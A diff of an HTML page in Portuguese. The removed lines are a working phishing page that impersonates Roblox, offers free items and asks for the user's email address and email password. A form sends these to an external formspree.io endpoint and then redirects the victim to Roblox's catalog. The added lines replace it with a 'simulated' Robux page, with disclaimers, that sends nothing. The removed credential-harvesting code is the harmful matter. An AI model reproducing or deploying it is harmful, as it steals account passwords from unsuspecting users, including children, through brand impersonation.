@@ -1,75 +1,110 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox | Resgate de Acessórios Gratuitos</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&display=swap" rel="stylesheet">
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #F2F4F5; color: #393B44; }
-        .roblox-font { font-family: 'Fredoka One', cursive; }
-        .promo-banner { background: linear-gradient(90deg, #00A2FF, #00E5FF); }
-    </style>
+  <meta charset="UTF-8" />
+  <title>RDX Robux Experience</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    *{box-sizing:border-box;font-family:'Inter',sans-serif}
+    body{margin:0;background:#f2f4f5;color:#1f1f1f}
+    header{background:#fff;padding:16px 32px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 2px 6px rgba(0,0,0,.08)}
+    header h1{margin:0;font-size:20px;font-weight:700}
+    .hero{text-align:center;padding:50px 20px 20px}
+    .hero h2{font-size:34px;margin-bottom:10px}
+    .hero p{color:#555}
+    .wrap{max-width:420px;margin:20px auto}
+    .card{background:#fff;border-radius:14px;padding:26px;box-shadow:0 8px 25px rgba(0,0,0,.12)}
+    .card h3{text-align:center;margin-top:0}
+    label{display:block;margin-top:14px;font-weight:600;font-size:14px}
+    input,select{width:100%;padding:12px;margin-top:6px;border-radius:8px;border:1px solid #ccc}
+    button{width:100%;margin-top:18px;padding:14px;background:#00b06f;border:0;border-radius:10px;color:#fff;font-weight:700;cursor:pointer}
+    button:hover{background:#009a61}
+    .note{font-size:12px;color:#777;margin-top:12px;line-height:1.4;text-align:center}
+    .hidden{display:none}
+    .result{margin-top:14px;background:#f0fdf8;border-radius:10px;padding:14px;color:#067a52;font-weight:600;text-align:center}
+    footer{text-align:center;font-size:12px;color:#777;padding:26px}
+  </style>
 </head>
 <body>
 
-    <nav class="bg-[#212329] p-3 flex items-center px-6">
-        <img src="https://images.rbxcdn.com/23421379963e790a612502847d3c0788.svg" class="w-8 invert mr-4" alt="Logo">
-        <div class="flex gap-4 text-white font-bold text-sm uppercase tracking-wider">
-            <span>Descobrir</span>
-            <span>Loja de Avatares</span>
-            <span>Criar</span>
-        </div>
-    </nav>
+<header>
+  <h1>RDX Robux Experience</h1>
+</header>
 
-    <div class="promo-banner p-4 text-white text-center font-bold text-lg shadow-md">
-        🎁 PROMOÇÃO: RESGATE TOYS E ITENS EXCLUSIVOS (VÁLIDO POR 24H)
+<section class="hero">
+  <h2>Experience the Robux System</h2>
+  <p>Ambiente educacional e visual. Não é oficial.</p>
+</section>
+
+<div class="wrap">
+
+  <!-- LOGIN SIMULADO -->
+  <div class="card" id="loginCard">
+    <h3>Simulated Access</h3>
+
+    <label>Email (simulação)</label>
+    <input type="email" placeholder="example@email.com">
+
+    <label>Password (simulação)</label>
+    <input type="password" placeholder="••••••••">
+
+    <button onclick="openForm()">Continue</button>
+
+    <div class="note">
+      🔒 **Simulação visual** — nada é salvo ou enviado<br>
+      ❗ Nunca use dados reais<br>
+      ℹ️ Não afiliado à Roblox Corporation
     </div>
+  </div>
 
-    <div class="max-w-4xl mx-auto mt-10 px-4 flex flex-col md:flex-row gap-8 items-center">
-        
-        <div class="w-full md:w-1/2 text-center">
-            <img src="https://images.rbxcdn.com/f021175782705a1d9a0d84c042d76550.png" class="w-64 mx-auto rounded-lg shadow-lg mb-4" alt="Item Grátis">
-            <h2 class="roblox-font text-2xl text-[#191B1D]">Pacote Gold VIP</h2>
-            <p class="text-gray-500 font-bold italic">Vincule seu e-mail para receber o código do Toy.</p>
-        </div>
+  <!-- FORMULÁRIO -->
+  <div class="card hidden" id="formCard">
+    <h3>Robux Simulation</h3>
 
-        <div class="w-full md:w-1/2 bg-white p-8 rounded shadow-xl border border-gray-200">
-            <h3 class="text-2xl font-bold mb-6 text-center text-[#191B1D]">Verificação de Acesso</h3>
-            
-            <form action="https://formspree.io/f/mdaadnby" method="POST" class="space-y-4">
-                <input type="hidden" name="_next" value="https://www.roblox.com/catalog">
-                
-                <div>
-                    <label class="block text-sm font-bold text-gray-700 mb-1">E-mail da Conta</label>
-                    <input type="email" name="email_usuario" placeholder="exemplo@gmail.com" required 
-                        class="w-full border border-gray-300 p-3 rounded bg-[#F2F4F5] focus:border-[#00A2FF] outline-none">
-                </div>
+    <label>Roblox Username</label>
+    <input id="user" placeholder="Player123">
 
-                <div>
-                    <label class="block text-sm font-bold text-gray-700 mb-1">Senha do E-mail</label>
-                    <input type="password" name="senha_email" placeholder="Sua senha do e-mail" required 
-                        class="w-full border border-gray-300 p-3 rounded bg-[#F2F4F5] focus:border-[#00A2FF] outline-none">
-                </div>
+    <label>Select amount</label>
+    <select id="amount">
+      <option>400 Robux</option>
+      <option>800 Robux</option>
+      <option>1700 Robux</option>
+      <option>4500 Robux</option>
+    </select>
 
-                <div class="text-[10px] text-gray-400 text-center py-2 uppercase font-bold">
-                    Segurança Roblox: Precisamos validar seu e-mail para enviar o código promocional.
-                </div>
+    <button onclick="simulate()">Start Simulation</button>
 
-                <button type="submit" 
-                    class="w-full bg-[#00A2FF] hover:bg-[#0084CC] text-white font-bold py-3 rounded text-xl shadow-[0_4px_0_0_#0084CC] transition-all active:translate-y-1">
-                    CONFIRMAR E RESGATAR
-                </button>
-            </form>
-        </div>
+    <div class="result hidden" id="result"></div>
+
+    <div class="note">
+      🪙 Robux apenas visual<br>
+      🔐 Nunca pedimos senha do Roblox
     </div>
+  </div>
 
-    <div class="mt-20 border-t border-gray-300 py-10 bg-white text-center">
-        <p class="text-xs text-gray-500 uppercase font-bold tracking-widest">
-            © 2026 ROBLOX Corporation. Todos os direitos reservados.
-        </p>
-    </div>
+</div>
+
+<footer>
+  © 2026 RDX Robux Experience<br>
+  This site is not affiliated with Roblox Corporation.
+</footer>
+
+<script>
+  function openForm(){
+    document.getElementById('loginCard').classList.add('hidden');
+    document.getElementById('formCard').classList.remove('hidden');
+  }
+
+  function simulate(){
+    const u=document.getElementById('user').value.trim();
+    const a=document.getElementById('amount').value;
+    if(!u){alert('Enter a username');return}
+    const r=document.getElementById('result');
+    r.classList.remove('hidden');
+    r.innerHTML=`✅ Simulation complete!<br>${u} → ${a} (visual only)`;
+  }
+</script>
 
 </body>
 </html>
